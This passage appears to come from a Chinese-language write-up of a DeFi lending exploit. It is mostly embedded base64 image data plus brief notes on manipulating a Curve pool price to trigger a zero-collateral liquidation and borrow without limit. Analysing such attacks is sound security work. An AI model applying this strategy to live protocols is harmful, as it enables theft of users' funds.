yBNJvji5ZsuT4ajkbk53z4PdxYN3N0Z2rTNt5PHyJTuMEp9C8UJ43R7EGZ5YsGT1ApWFhijmImSFpSUwiSUuiNElhV7uzWabnpV34Z3q++fYU&#x2F;Ww777Bv5ypzZskuc5NYY8&#x2F;m&#x2F;&#x2F;a0U8Zch1zrT50HmpkzzDLIb9rOXzJt55GHgjZXkK7feR0O3hw9YNYfX415sTDFHMRUkpT2kUL4aPaPwiS1Dv5oybzE8wwlF3KfUuJa8MXZkiauB3mNPzAZrhdK5jX+FNmII3e6D5SN1zqd3TJItuuXjDmzs+eb1cxXn4BIsvU7VzkkxbMjSAqntp3ftf5SHknPwD8uISKU581TBkkK&#x2F;3pe2gWURsKaRHMswjIpZpsktf5RrCTlrWqwncwnaSi5kPuU4teCDW609y0QNhx3qGV9koaSrS8WlqTi76WQurvL9PQdAOq1nWcxiTQxDsmOr3YlKZydT1IUlTePr0ZGBkkKFA5mCIfyBH7C5dvOL7kE5fe8BDq2knQOYjpIav2jBEmKPMonqSQXcp&#x2F;CIL9KjnCRzWpV+DVEUvyXT1JJRsAnkTTg7yXfcISzzEsGqbf+FFMJZaVPspvHV+OcdOcqOTuPpJwMJSCHAyTF4oCDFp+4O199kl5fcmn9qZ6+788v2eVXQTGnMC0kFf8olZG0gPuU4tfCS1ROUvHF4jhuIQeGUaBJ6ClUSW+CZaikJKXZZZ4kZW2XKRkhSZG80U5TmaTA8+uXUIoGKK2YQ5g2SYraaiUkLeQ+pQxJmqqUpNYXC5M02nwkQLKd2bnqOhpkd+HPm6PBOen14JwUFdo8kkICylu04xafk+a9f7Fz0rbzNCd1Ka2YS5hakoKPE&#x2F;JWhFO80Jw0mzHVvcDGepNyvKo4yVHuU4pfC+gGOUMklWvkwJMKBbNwk60vFnKOJv5eCoBkI85HgSZkvvUNsUCy9aMHXOsuydlIwxGxEWw+AZL2vATW3UsF3r9YkoIVGfLB9TBfonny3jAr5sdiBrLIih9rdIySsX5SEs3e4uPkRDADUs5JfgR+rqPdp5S4FqiqaG2C0oCCZPTla4Ct+B6453WSU75jF9R72bobCIARAL&#x2F;5JBKeOf6anXQGX4CG3pNGkbTnpUs8+QRbMZYn70kh26WCZiMsFEo9w+9H1&#x2F;Nb1fKCbShmFWZ6WeAkLi0qiXKWFsUV7vuXogC3xIq5BSXpnEKuqK6hmJ1Qkk4WSANlzbYwaHUgreVTKGYDSRUKRQkoSRWKmEN9HCkUMYeSVKGIOZSkCkXMoSRVKOY0SRPvz8qYLwrFfJKkHbMx5otCMZ9IWvdzjdisUEwplKQKRcyhJFUo5rp199VfTl5lFArFVLyCefWfdVaqUMRa3dV3MArFlELnpApFzKEkVShiDiWpQhFz6IojhWKur93VNzAKxdRCd8EoFDGHklShiDmUpApFzKEkVShiDiWpQhFzKEkViphDSapQxBxKUoUi5lCSKhQxh5JUoYg5lKQKRcyhJFUoYg4lqUIRcyhJFYqYQ0mqUMQcSlKFIuZQkioUMYeSVKGIOZSkimnHZ1evXv1M+71sKEkV04xVX1wFfL5Ke75MKEkV04zPgJ+rvrh6Vnu+TChJFdOLVV98ATJ0nYrSsqEkVUwv1tF0dNXnX6zWri8PSlLF9OIs67mfXV2nXV8elKSK6YWQU0kaF5Ke7ny9cMTEVGa8xWbTE6mUMSbVWGUmAwNNTSeXVp7t1&#x2F;8xoavu31PByYc21eDnyO4yTh76&#x2F;X&#x2F;6P9as3c7fRjY97SfXrf33Ci5vTLa1wf0p5Fx79d9K381fvU2VD+H5Lc8e2&#x2F;Jc+VV4vr19y7NlH34Rfxxrb78cPu+nP7GX7viZmeskfXWjmTBJc16x&#x2F;NULg7c3OBJKkbRrW1kk7rhwNCJ1sKmpqWlDkWwH&#x2F;9VMCGXxbVwk&#x2F;cNmJ8&#x2F;Qia1RJDXfDkd2TrCH65L1xUl6IpKk4dt2MLKriCnvvdMOOFiyVU8+8Uolh4mkxhwrRlIawnNZ3e1aaSZO0uy9scjH7DSSNPq0QRrpBfGrt90hXzl8CTfZJF0+&#x2F;O+OqD7yboF6&#x2F;uHzSkhack5ajKQmUul4c8tzQBhgazny9M3iZxU6HElSe+lpDJ89MZJu&#x2F;Je&#x2F;X+v8aJUxtzs7f7PamKErnZ2dL5i2K68bc&#x2F;oFs&#x2F;EapprTL9zu7PzQmLZrcNS2L5XJel69MdW9HgjF6oX3m73GKpNr&#x2F;LYXfieaPa+xim52YlGDSXne4hq4+57npTEpC4dy9BMOQ2GQK43&#x2F;Pc9&#x2F;hMNBughdC0ia9eqxMLjU2KNeuDSj4w7IwpNL2&#x2F;ZuGGwCYdlFonFg8yB+tu1lLXeASMpK7+DmATzMJO146v7jTXDCYBMUMrDt8ZN&#x2F;aBq2427k8xOb&#x2F;tGyx5j9LS3wgZ+OxJLkQy0tv9hqhk787QQePdSCvznZjGzf39KSz9mhE06ZNWbN2paWlt3A7hE3MyRDmXA2UJmV3ZEWwG5zaNMI5eJqHbnFFeyJUHjDPSwkre7Fuya3Ldf42NV&#x2F;LGow1Rc37YFC7N1shlz2tvF9KazwMoikz&#x2F;&#x2F;0fz4F3RRE609&#x2F;fog7QAAAGMFJREFUYp584n8+hU9QY1HOMpWffAJ&#x2F;vrll3RN4OFgInv2KMW9+2s6kJZJyLlB&#x2F;A7lMFym8qaCiEEOSXut8ve3ah+aT36w2tz9aZU5&#x2F;gOQUkgKLkaSdH8DhoSsvGDjbdKAgNSm4aYtrEs31JtGcNtW9rQ3wPectrqm+2FCXTJu6ZIaes4lFDbnFNcStDD17c41VIIqBvs4jGHJBIQUkqVwr1ViVBVJmM5yDqhESkW17mzabwWHTM2JM18mlZqBpM&#x2F;JyYNhXa5s206FtVWawaZg+maR3LhzteXwD5Ti5dODCP&#x2F;Zuu&#x2F;&#x2F;UUhaka9b+4m8nNv1jU80hJubIphqzn6UeCkBK3r&#x2F;paUg+cusXW0GCwk+QcJy8Zu2tPW4uwZ+fNkMntmMhIElH9qAkXbO2ZTd8P3JrKx6Sua0IWSEfi+r9LXsg95GtUBRQeXvUzLVAD&#x2F;uSlO4E37Zc42NffPFjgzGrv9gEF5O7+V1N4LbxfTHG&#x2F;O7XohUXIWn7lufe&#x2F;PRZc+xZ8947B82TT2x5DlTYJ59AtRXYBfNLOvSKefPTLc86Gq4cfvKyFPemS1LJBYdIhAoS&#x2F;&#x2F;xPs4SkHyIbT4OYvPI6UjKKpB+tgm8bUeZ+4D+DUFzWo+qZa6yq7q2n+4hP0nogJdyzVLouWV+9sAbEZmJRA95FuK3ZNN5RGBAAzG1M9d0qKjiapHKtVONv4VsCFOZcYxUy3dW6hKTDVqXtefwokrPjqaVAOTqNJOngBjo8uK0KDwN5Lxw1HXdQqgJPTdveDQPDbXs3wGGSDWvW7j5ya&#x2F;t+oAGLKZCLvkUolHzk1nbgDhIFOUvJQydAFOeTFDCyG8kGNAO9FUm6B3&#x2F;v301EBKbjmVzAcp5sYulmzdpNNaQs0+TUJ2m0vhvs4RBJ5bblGqs+u&#x2F;puA6w4yjjJtgC6bXJfILWokY1JugXYSbQ7dpnI+SJwi6erzD2g2LHL5s1PX8HDoUIAROsASTkXFh8k6fTpuxNVd&#x2F;GFNGq5nZ2FSQpfjfkEz&#x2F;rAmLd8ktYl63FqCiRlWvHNwY&#x2F;qhTW5TPWPP1Tf&#x2F;R70Iq&#x2F;VkhR4hQNB9KkcKMeo&#x2F;LLyHElSvlaKVGRQzSBbQZKy+YdpJySF35stSUH5xcMyF7XqLlIZ6Bsg6StI0qETWw9tqgEZRvoqMC0w2aRk0G5bmCxH3n0aqTuy2yb7tp0g8HgESal80me34xcQoqD2bncsQmI3gmqhxm3VXX6IfBs16w72cGGSrqa1u392k+m+WZLKfYHsRa1sou4Sed78lGQik9RqriJvSWTmTUGZpC+2s5E3QFLOFUFS8+ovZxdJP&#x2F;R&#x2F;FiEpSFKAK0kXNeCzN5VPUqBebnFN9d3RH776S8bOceRuCxuhIGSpMdnGKs5cVJKmQJJ+C5JXTipBUpCcriRF6m32SSpULkBSFLRhSXoEBNqaP24VyQVsOAQTRR+SDAAZewh04xoUqpIsSnEIcEqkJN0etiENndjt5xBJ6tuNKId95bNm7e6yJGmqGElNz7tXr149G0gWLUpI6ty8X5chSYk8KDkdSQpAS2yIytEkhTMjJCnnmv2S1NxG+xBOOG+D4Yg&#x2F;QyRtu0afdk5KFhy4QTAfCZGUJjZpU333x5rsj2lhIpwJk1l6YlMaf0Bhov3SDIek&#x2F;Ou+PVeulWqsIq06EyLpaTBwybsVS1KYaLqSFA5ZklrtN5qkqAUPbKtySArE2r&#x2F;HjGwfIvspTTJrDrFlSCgBycxCJAvpxkMnWmiyaVz61CXdqRFOOmX+uakGZOJ+MhzhYedhILRDsSlzUtKfD1lJPbLHXPKrYeekoXdgwR4OkVRuW25xDVc1kFx9scHkyIAE2eS++HNSsPKVJilMOIMkxRPoLNF+C5H0pz&#x2F;hly8BkkquF0FPjpyTRtcsfiQF6y5YeT&#x2F;p7PwAGMmfkAr2XSYpWneBBHU&#x2F;&#x2F;6UYBFGn7XU0HUtSNviZRHPG5KAj+PSc52VwnkpMBIkKNx2OAlfRQMhWX0gXkrK9kK8FAwoGBxsX80hKBlshac&#x2F;jTU3bfEmK+i3ajnzrLphxC5AUlGMwLQlJza9BgRvZTQqvWGuHTrSAGUlIKsmomgLNtorp5xd&#x2F;w++k7voyMThWRlpaNq3dbQs91NKyZ79PUix909No891Dxl1Ue4d+TxISEkha01uYQ3DYnmXJnGgOvMgK9jD2rAcUpBsDtw1NCZ53j0z1NjlFyY2&#x2F;pbffYt3FCYlh6y4yOB9BGXmsvX3LCz5JQVNF1jnW3fZXCpEUjl5+4lkyJMlL2Ms215NPtG&#x2F;5nyjrbvHX9TF9TyqMLP2edL6i4HtSx25UMUAxmDDkPWkJsLbryLupWyj26&#x2F;9w7YIxgmi701CzmSHpdC7XiCEibCEwOyWj6riQaJ6cFwG84qg42L6UqliEjIOkB7Gr6pJTr1NWChrC01KzGSLpNC7XiCMijCGggVaykGhqEP0GNIhK1+5OhKS&#x2F;KrqUYSYxh9buKhSKiUJJqlDEHEpShSLmUJIqFDGHklShiDmUpApFzDGT7lNCSDTTBlBZMV8eJNeEENimNgF04UL7fBTfbzXJrhimuytfiVwB&#x2F;947l+0ulLIAy4UK781+752ANxNY&#x2F;YeLgfK8osBywGNbnnsRFge9Okfe882k+5Q8hPaGltrjH8wVXL1a6h2dXYhfFkntCr&#x2F;iwLX0UcCFgNPlimHKuzJU2O8il8AzSXFRHW6mLgHYD1oEx4IbUIiksresEEk7aHXtrMdMuk+Z3JFVfXc0PcMkLXQabU4bPwptSCuCqezKcGHRyxxfPMhbPEP8KoDQNrD80kwUokn6&#x2F;E9&#x2F;Ql4VeHntbMdMuk9hBynicCM8smCRNXo54a2G7D4lm05ZPylurlQGN3xzma5XFXDp4Gxss&#x2F;sVF9fI2bgJp5dW7+Nq&#x2F;TQ5djF2fT3qsV3b7t+BlfWwwn5blen5&#x2F;f076B8FFtiDDAUXDXz+Zsd9Cim7RzaNtHyxFj2h2CX1smIdIMmw7B12cu&#x2F;ZT0fFqwqsma8xRzb96QS6OgnBNoS3YRbvSmxm1dYHD&#x2F;6&#x2F;Il2Z+2uy9R50Cjum4a30dQ9HmqHrbGGlHKsRSV88eAwFKjspOXbwRfwENdZuQvGVXjlbAP4R5DCsnhf3Y77zBciFi+JdNvNAgz0asxkz6T6Ft5WJw43wyPoGNkPgfgqki3Wf4mXwUxxucK66ZL27K1SKklzRklRctCSa63GdNO6YQk6jh5WwiOxqOrkUNrENHMWtaj2Pn1wKGi4fBarC7hg6tMG6T+G1bYda9uxv+WLtdtkcBjs4HWcH&#x2F;p4x2HCy3YyQ7xL0mnAI&#x2F;KTswVMO&#x2F;eIWezMJgLtS2lOiK7GZ7z54LvvXB0sLd2XOq88uvk9+a2D5vpA02YqubRyxXHzxHpO0&#x2F;TJ8Eyclx9oP4gF29gUbroFfeAj2jNHZXALpzFueNW8e9DnPR2SXC+a6HBa5b+G0ar6TdELuU4gG4nAjSkdj5w3wld2nwM5ue4L4P+I8uBXK343q5oomqbhoSTTfw70MsGkKLhf2vyIkvXDU32M6TD4XBjeTnxRjJWkHCtdhcZ8ilpVDm54e2fSnE1uFjbDlxVlSH05mcoqfFNjiidtCURTnkZS7UtpToiuhmf&#x2F;1YLvJNj794FLBrsw1VmXTiUV&#x2F;Rl9D2bRPUpaqLkmLuT9kVpGnPWEWkBN+Wve5fNYrdNg5OyBJ7W7PAEk5Fx4JknRu6Lsz6T4FnFA5DjfCIwt1UjsYaH9ia4Nlmzjc4FxQChQC59Vbw6bNVYCk7KIlgQoc7mqkTZAFSMoePNGboE9SMOriESIpuBaEw3aGStrg&#x2F;j1r1m6H&#x2F;ZmwyZMYZ91tYidiMu7xbEF&#x2F;RmjUFa8q6PEEfK1E72bjrpT2FO9KaGbrngf&#x2F;YbLpnzzYuqpQV1qS1pciaXHjdUD0iZMSIanVXPEs2sS55dm8Keh7RFI8nkdSyRVBUtbZZjlm2n2K43AjNLJQFvqDwQ4JZpt1uEG5fDb6O&#x2F;xS4AXAumguKEnJYSE5D+STipMUXac4klTcLwhJhcpCUpKk6IfhEHEMXYhtJcdgDjgZABIUfYWRVxWx74q8DYO7UtpTvCuhmT95sH2VyaZXbX2wulBXupIU9NsJSlLfnYkrSa3vAyYpz0MLkPRFK2CDJKVcKkmnwH2KOPhjhxt5IwuMORkrJqwjIyapONygXDy87CRXhqzkslPMT0CUU3bfRUuiuR6ncrJz2pK0izww8LsVS1KYcAZJOuCTlNwfOSTFKdvQia3o1ghTRnDeiR42wSJkozmA8wQ6Q3yXsDdP2Q&#x2F;u23mDDgG4K6U9Jboy19rw3IP&#x2F;&#x2F;B105dMPnivUlUzSBuhCntqD61NLUhHfMidFy1tJkrKTEoekREA6S7TfQiS9bN57J1&#x2F;d5VzgPgXmuhFz0kmKKjJDmEn3KaiFsXVXHMaBgYItr2CX&#x2F;RKNIOjvWtynWAeQ5HCDc5FkTDXeB+8pXBgyTny0iLtlJilbfa2LFnhOkDcPvHSIpLxKQWQk+FbZ65MULEYkQ33rbpO1J&#x2F;GLxCPvPo0Kr&#x2F;gsAavtFygfkaQ2GTxQO75L0AEKfYK66zuVDw087kpuT6muzHnvPtiDE8+nH&#x2F;x7oa78C5MUckNX1iW91nuOJJXC&#x2F;J3Z0QsnQpYedlJCJEVNFW1HvnUXXFAXIOmbn7a3vwBOddnMxMqx5Hq+vf3ysQjrbnnvfeMLdZ8yDSj0nnQCrhgq910SxNMPng58TgSi7bLNLkboYrtR&#x2F;GpWEdR9ynQgYsURzE4n4NOoct8lU0ZSXnGUc+J0xAQdtOIohjWrDOo+ZToQYf7EOCwz5xvk3y1Jx+sLpcTa3TjgVV27q5jFQMORMb&#x2F;7zwcVhPlUzAx0q9r8xGp8QWrwFYwi5lCSzk&#x2F;87j+RnatJoCpiDSXpPEUVTkaXPpjdJpX5ASXpfAXws+pBWVvwFDMLJel8xe+ee&#x2F;Bgq8rR2QAlqUIRcyhJFYqYQ0mqUMQcSlKFIuZQkioUMYeSVKGIOZSkCkXMoSRVKGIOJalCEXMoSRWKmENJqlDEHEpShSLmUJIqFDGHklShiDmUpApFzKEkVShiDiWpQhFzKEkViphDSapQzGmSUmyfGYGEDascGHGo6&#x2F;33KQbBeAFxo956&#x2F;&#x2F;1JC1KbaObAjX5CZOf6yX7owdK5FLMZM0rSyqJdBS82UZJWxC6OVYpByrgWFNxtPJGk3cCnJq9Ftl2VkVQ6R0k6BzGjJK2+OxoM7RtzkvpRTqeBpCURSVLFHMRESTpKISqzEvM+BdHs65L1WfqNyTieYUhxQMvqhfebUSClMtV3MRamB7kwhCiEuKRcEgczMfao12uswojyeJiQWHQPkm3mXOO3vV7GvzQlc6zNjA1PClWA00Ps4rieGKITA1vTpajCmIejnWJ5GAu7bJLC2VQNuLQtTGKg2sNBkqaoQlJhaAjHCnWTscIQIdgPREoRl+loKp3FT5NonlgQNsUsJqmXwTjRMHYhIHTWy8D3uqSXhjjQnIwRZ+uS9RxT21T3tjbAZ12yHockR+OWiJucy5K0eXENxu4OSVIMOp3GGNQQoDvnLa6pvtggl+ZkklqpDCTB2fSXT9LvIJ5wvc8QqolUOCxJIcR1+ZL0G3jgQBBkfsKI7swklcN5kpS7jSosJA0lJ76igOZ+5+Bh6ZSUl6YqK0nnt7pbl0zjQIYxA8FaqyEYNESbbrzPybmMwZDRKDZTGYodn03jEM0yDXhkIfsolyUpDE2gRIS6m2r8Hsd3No1jEnPhpSU5MVZDUeXHaCBThaPVXawKqd&#x2F;MJ6lwiKT4qzBJN0I8c44nLsCHDWunIZLK92iSSoVDJLXtkBwBkhLps+lg3RXzeE5KMduJpDTGefhIcvXd+z9+BXQBnQxkrzM0c41VIIrxJ40zyVUOSYGN9UxSOsqXpo9suu5hw3c&#x2F;1mTrSR8sTFKsGmjivaRRZzlqPVW4TJICO3+TH6QMr00aRxRJ+fA4SZplRTxEUu4UJemcwGRI0noUEvAvRFJOTowdT3&#x2F;36C4yxBmlOLPzWhtkWPJhyVWWJM2g0EC1N0RSTs7eu&#x2F;uXHx6y2usM7iBJRbY7UhSEqr3iRCQpSmdph1MYE0gOj4+kUNkCkhT+KUnnBCZOUtBSQc2F8RskqSQnxr5sSP0ICl&#x2F;aHaUsMtN4moxmPxcyz3NIKqJo47WPVlFu4DMMU5yCBUhqk7P3fqj+6xgp4HDpiw0mm284guQcmYJE66b5KBufrarKE7x6nO2VNyelWTjMYu1bEiwMOoan23g4mqRS4RzMwMl25SZjp0OyldN4WFpvSapvZuaz4YgNrlm2ywZJysl1STDOpq1JkknKllcYZmSLhMNs3YWP6l6vcdQhKZgsIZ1JyuZNSHX0PXtpTk61NsDlrUE25XnpbL66m&#x2F;W8xt&#x2F;CQ4ENy6KBykVyZJDl96Q5z8ukyjYcQbW&#x2F;hNKygcLqkl7rvYU1chhV61Z48OAnqRkZzN3Neu29RYFkaAec&#x2F;TUJWOgc9zC2Xkha2RtpRbwwX5cFjucF59QVUxyRS4sqhIhxxSyEknQ+kDQn66QUsxHzlqSwdpcWFvD7&#x2F;3FgMtfuTrEkVcxizFeSKhSzBkpShWJOk7RWMUWY1JusmN1QksYTMz0uFDGCkjSemOlxoYgRlKTxxEyPC8WcIenKZetmciTvS64ofVJ&#x2F;6zPRB7Dyr77&#x2F;&#x2F;s+K5PW87tra2uXNXqFCiuSqHOcWPoY12lgxSWVjgOwnLQ+Vna2YlyTdl6xk7OdfrBKS9ndHk&#x2F;SXJXJTtuWLAhXNLywyV7+3omR79uFKvm6fpLW1b1VO0tCut7IdNvDZsEa6NNT7w3wk6bm7o91TTlLGDJB0+djxHWW0Z19SSpsxkmbvwX7bUlCSzlKSjpIU6PdQIezv7vO8FUCefvqNyThkgVDLm&#x2F;Hsc+A+BUZo345zd2Gg9nmQC4XK4cckFzKwb0ft8rFHN7xl687dAIkDhxlQGORaSZfu6+7Hn3AeUGMlyadzNzAPXAHTuQqYEEHSYBXySNqHybYwvvTKZd&#x2F;egJ+QmYhHuVYuuz&#x2F;2mF8mXBoOUy6&#x2F;PUzSlbZ5ZZFUHKTwov0QSUNeVdh5jPUtQ4ft2YlFDdl6U&#x2F;fwSy+DW4TIf43sbMhlYDW&#x2F;X5i6eZhlJPV21J67+Ext37J1tX2HH6vt93bA931Jr7u2f4ck9wFp9iVXwGhc3ryi9tyN1mfgc19yBQ5+yIlnkNzhXJakzYcfg7NDkhQKg1Pg8isPP1bb53XDJ5y5vLnbEX0snog3UgXIESFJQ1UIk&#x2F;TcD3SIU+XSK73Dj8H3b+DJgkfoeH+3tMEVv5IrJEkhuQJJyrtexU9K2MlDyKuKdR5DvmXsYaF0YxW6gWr8tjedsl5vLEk98kbjeCTUmewsU3f3JbuRQzAg+5etg5GGY33lsvucvHJHbX&#x2F;38kXPoNjs21F77sYKHLIwJvuJNChKiKtSmCUp8AMGeJCkdOkVtX3ddGmgwvJFzyCHVi5bB0SNIClXAcuOIGmoClHqLhZHqXLplSL3a4WReBzywE9+BmHnOLlCJIUsRUh6GzaSd34oP3lPqvWTEqHuOnvBxXkM+5bxHWDw2eTKBnxoLKxJZcR&#x2F;jSWp7DdXdXf2zkmRgExSGtI8YiX5HLhPWT722EpWE3ks4gheuWwdyBARX06uMknaj4UySZtXIEngGOu5IZJyFQqRNFSFMEnRyIPaMElKvrRUDDVYn6RYC6Q0adiQe4Wfq0ySftLZ2Qn7Z4PgPd7WT0qYpEGvKuI8xt3ny94PZbc5+ashkrL&#x2F;GiXpXJKkK1DywL8QSTl5+djx7v9+dHedHcw0Fsmu2fqMSCk+LLnKJSlLTFeSMtdIhAVJSkcKStJgFcIkZUXBV2dDuboDktSykQ8hjf0KT0ySkv8G6yclRNKQVxU55rqtcH2x0FaggCQFrzcqSecMSUFFhNELzAiSVJKXj335TN+PMLsMvGlgedUteqAc5lxwBOa8lqQicTde+4jncPCKA3RNIWk&#x2F;2JdWhPRnvhoR114DlO58koaqkEfSHbX7kmiHwmNyaYfa525YkrIk3uEacHE6LK+dpD10EPqpuXzDEW&#x2F;iFj8pYZIGvaqI8xhLUjnMZ5MX0D8xSa3XG&#x2F;YSY9VdcdGivlhmmeGILZL9rhrovxqh5H1JIE+3NcgybWhsI7dJ4sBhNq3Cx7kb3rJRh6RgVYV0Iin86u4n6y4ki7kWdE4Quyik2axLNlRr3fXQznz40d18626wCngyGKRI5GPZXy&#x2F;0C+NLi0iE+n25Q3JRK1ce&#x2F;hMoDHJlVIOl07A98p50X9JrHRkr37rLvljETwpZXsV9SsirijiPsU5A6TCfTamJ5h+EpOK&#x2F;BrzEuHNS8V+jvlimGXNmWaDYUCtEqfekM4FxvSedTqgvlumFkrQ2dog5SdUXy3Rj3pMU1u7SwoLxrridZIxr7a5iLmPOkHSOYVJvsmJ2Q0kaT8z0uFDECOrjSKGIOZSkCkXMoSRVKGIOJalCEXMoSRWKmENJqlDEHEpShcLEGv8&#x2F;R4tmpHRo2XMAAAAASUVORK5CYII=&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;应该要在curvePool上操纵价格，然后0资产清算，无限制borrow。&lt;&#x2F;p&gt;
&lt;p&gt;0资产清算要&lt;code&gt;borrowerAccount.deposited[_collateralAssetId]&lt;&#x2F;code&gt;为0，
假设deposit USDE，borrow USDC，那为了满足清算条件，USDC的price就要比借出时高5%。&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;web.archive.org&#x2F;web&#x2F;20240221012029&#x2F;https:&#x2F;&#x2F;docs.curve.fi&#x2F;stableswap-exchange&#x2F;stableswap-ng&#x2F;pools&#x2F;plainpool&#x2F;#remove_liquidity_one_coin&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAAXEAAABbCAYAAACFx7VAAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABgISURBVHhe7Z3PaxdJFsDf7j0ISkBh2fFgcgjDsjKwklMgAfGQk5BBZm7DzEHIYRDxqMTjIOIh4MFlbjsEA3PKIQgKOQUXRFkkB5NDZhkYQQxI&#x2F;oDd915VdVdVV73+8U0n347vA41+u9Ld9V5Vv3pV3f3enybP&#x2F;&#x2F;V&#x2F;oCiKogySP9t&#x2F;FUVRlAGiRlxRFGXAqBFXFEUZMP0a8bvPYev5Gszbn4qiKMrRop64oijKgDlBI&#x2F;4A&#x2F;vnv32DLbYHHHpXx9h&#x2F;46QaVfQc&#x2F;Pff3P4dlPkZRFOXz44SMOBniJTj&#x2F;agXm&#x2F;vEFbivwEmbh3tMHXLr8dAmm9tdN2cNtOMR9uxt&#x2F;gztrAPOPf4QrH20ZbwuwykcpiqJ8flgjnvJ8cUPvWCrrvNZ991u4MrEHmzd&#x2F;tjt+hjtP0FhfvIz&#x2F;fwB&#x2F;v4hG++1tU7T2DHbQip+&#x2F;8J35TeDftfO+j1k+RVGUY6Lfj33owebcB1hZuAEv7C4mtf&#x2F;GGmzcmoTFf&#x2F;wLvfR7xtv+Gg0575+BnYfGEyeWn&#x2F;4GS2joiUP05heLwUBRFOXzwhpx8kaXYMruLDjchrmF37NlFeMcIxnxRYB1fynE2weekSbyhtrUm5ZlZEPek3yKoignzMl44hXjS2vk92DmHf7eusoe+WajtW7vOPXGFUX5DOnfiC9esj8shYcbecf0IJOWTxB&#x2F;ucRhvHEwSy0TdifhHacoivK5MX4BsOzaeOCJJ9bFFUVRlHH82Gd6EnxHm5ifm8F9H+C&#x2F;asAVRVECxs8TR6rLKXvhQ1BFURSFGUsjriiKojRDY6coiqIMGDXiiqIoA0aNuKIoyoBRI94ZE03xn3ftz6FD7&#x2F;QXsWNcxEhluBxP&#x2F;6SXEDYee3GNlGNntAebNZ&#x2F;PryY+d9&#x2F;d+AK+h+pHQP6n9fmPfeq+yjRfcBYfA7X6EMjWNfrcfv7xf+DeV2fsLwPLcN9c6+wW&#x2F;d8WVEif07z3Plu8SmnOZ&#x2F;4fyy6VEaVeQl37+srLYH&#x2F;YYyHY1xAnSyCj0A6C7PX1RBLXk&#x2F;WSr4uk63pCfaf0GZS9C+UusHLMZOsSnosJ+nWu3Ufony0gHV776N2byf5AxHKUb5zVtnvw0eAneOm+F8n1pWh&#x2F;QVAnSfawrvm2aCFDj&#x2F;Tmia9yJ&#x2F;LDzZqtFIoUYPc&#x2F;3Ab46l4wolNn9I8rOonA8lMbOIuPWYfdi0vNvAT2Qi&#x2F;DwatPdkdIXJdGDZM9J+rlB&#x2F;pwyZ5vYw+mFkvPd&#x2F;Xr8jqkl&#x2F;NeGZHWS6zrdXiP+vS9MFGGG3+B89geb1p3OJJlFt7v79nfhnw7yLITsq7T1yNy&#x2F;UXqE3W6zkJGAm9mGvTc8UU9c2VrN2DR&#x2F;nbb+j7u&#x2F;&#x2F;g7G5C6upBBMOVGBtO29e2epabPd4W+6YBX6&#x2F;ASZuBaUX9TT18n6&#x2F;uXYMmGniZy7U7GcWtxEg23K3sEcJ0suNCXanQtyp5t2+4y9E1&#x2F;yyk3rsLMxCfY2ao3vqx0bISJr77tnuABlX&#x2F;tIo7SvzoP5Tb8go00MX3VNkw47SMPghJK8OhK8V1wRN00RS2h0dktQ7gEFdI5f4Y7C96Xp&#x2F;dfwy6cgbPT9rfP2u&#x2F;w3v5XpBLa18g+9WXZwUQSH1gZqOM62XDzOizBsd1hG355a3cQQjvMt5E9QfJ6EmJdIiq6zsu+fB0HEryZUzepVBZCIZf9unmI7X4b3qBB4tDMjdq9bf8kpHYPy8IZ0HdwbfoMvP&#x2F;jNmy+A5iZc&#x2F;fbDJxFW3CA+xw7H5sMHg&#x2F;gG&#x2F;RuXS4BA&#x2F;ahr8lSt+lLvq5l2fPt11WG&#x2F;unPiHMc8DNw5VZD7+bdBziESfhrk79NQYbocAc2XaPiaMvTm4lJWC4GiR9NXbBs6aKZClHH&#x2F;77jVJKYWrwKB9YbKEfm0c5ZcPcyTvc8mSQOP8CO&#x2F;S&#x2F;x4o8PAOf+IsZEZy+HbkaeqmLdo5s29GJX4OU5b2aDBvLWVwAvn0RyCu2APlp3cteTaFOXSNd52Y1BOLhA3pwzZqVxzJeFzD++ClP7zzzj5CG2u7lG4Rxl2t3RpX9K7R6WWQ&#x2F;XwY6bmdFRPcrBkgYesgVWF9yWaJxdzoAcpIdOM8SQUNeS7FL7dZThGOjNiC&#x2F;zSPkFrLwCFNwoxPeEK0TexwROC0tFtnhAg8olr9usy+PU0w0M9xdMXXAq9tPcJRzdm38BGtQl8Epomlt6A6tvcZrfMmEFZzE6RO+y6Kiep4PGdXcr7HBJvZAXMjEL3xQ6Qm8jeuaQkuHFzb+ZmxEHuGB5i9dbqUPjvmLtFdtzCwdCe2OSxwKvHqWNEJFrB4+q7Hld111P7C&#x2F;ZuuR0nZfdLD3hzXzutWfI0DhSghGhLBxMycPEASnwwuV2n1q0ZTjVP+&#x2F;00KDd2&#x2F;dPSXaa2fhlIRweY&#x2F;+1ua+4buWSCi8XbYBxFDgOUujtSvdYE1J9yZDSdYaa9utbhq70&#x2F;nZKYSjsundWOFZgSaf1JezQ9zh4Fh2DRprPWcZceXHzEXoVs+xJNDofUtSfN+OVZGXg2URzyBPmGUHgGZjBz13vYC4c&#x2F;NJ6Qe+C1wRtB&#x2F;r3ZXhDhtmuAbaSwcG687xz2qyBeEEzmXPb8DD3nKKmHYiU7Nl61l0PyfYXsS4ZXQuyG0JDtvrrNhyid29Il&#x2F;meP3uGFU9bbvdyTXwFdqbdfZRv9yRN+met7DnMUkrpmRrP1S2p8PIlL2OgDBsf2LFz8nXqnx7p+8iQ1rVEvv36lGEURjPiuU4RTfGYtRvw8NWnYKrnM3KQK67LJ3j50POweTpd1oWmgjPv1lnB&#x2F;g3SnJ9h852wDhZdT4I63j3yEPz6VjDXmzjXYCECZxplJ1qAnQuTcPgxVZMaGQKwQxfntBveKMtf4k1NxtG&#x2F;ye3vJu3QRnZCup44Q2tQl5JY12nZzYwxs+wnlRXYdd7I0w6R2t14xsVSWeN2Rxr3z4zsEryU4s8YzHp56cFjO7ilMKozDjbpZ2Be&#x2F;+T2uwR&#x2F;F9pY7ktNdO0htN9qVxmOgdGMOAvtKxmnhHOX4PDds4TSzEid9BLsWmWbJY4Kbg3+Bzd1jepC3hyO1ps3b3M+T3Dr423Ahsyvg0myh5Qdz39gk8J2wpbrbnz+6Z205yrK4MH6RI8s4U0Eb1LQRt4fvaqF&#x2F;69rh8aye&#x2F;WUrifOqOr6RICna0H2Ym30ellGSz20jCCVuX5tPMPUtN9Have8DGK7N+2fkuzR&#x2F;U7XKx